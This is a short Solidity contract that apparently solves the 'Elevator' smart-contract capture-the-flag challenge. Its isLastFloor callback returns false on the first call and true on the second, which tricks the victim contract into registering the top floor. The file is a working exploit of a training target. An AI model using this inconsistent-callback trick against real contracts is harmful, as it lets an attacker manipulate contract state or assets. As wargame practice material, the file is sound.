pragma solidity ^0.6.0;

import "./Elevator.sol"

contract ElevatorAttack is Building {
    Elevator private victim;
    address private owner;
    bool private firstCall;
    constructor(Elevator _victim) public {
        owner = msg.sender;
        victim = _victim;
        firstCall = true;
    }
    function goTo(uint256 floor) public {
        victim.goTo(floor);
    }
    function isLastFloor(uint256) external override returns (bool) {
        // if the Elevator call us the first time return `false` to trick him
        // but return `true` if the second time to exploit it
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}